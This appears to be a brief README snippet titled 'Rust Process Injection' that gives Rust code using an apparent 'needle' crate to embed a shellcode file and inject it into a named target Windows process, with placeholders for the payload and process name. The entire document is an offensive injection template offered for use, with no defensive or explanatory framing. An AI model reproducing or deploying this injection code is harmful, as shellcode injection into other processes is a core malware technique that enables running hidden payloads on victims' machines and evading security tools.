# Rust Process Injection

```RUST
use needle::{find_process, inject, Payload};

const SHELL_CODE: &[u8] = include_bytes!("YOUR_PAYLOAD.bin");

fn main() {
    let payload = Payload::from(SHELL_CODE);
    let process = find_process("YOUR_TARGET_PROCESS.exe").expect("Target process not found");
    if let Err(e) = inject(process, payload) {
        println!("Could not inject payload: {}", e);
    }
}
```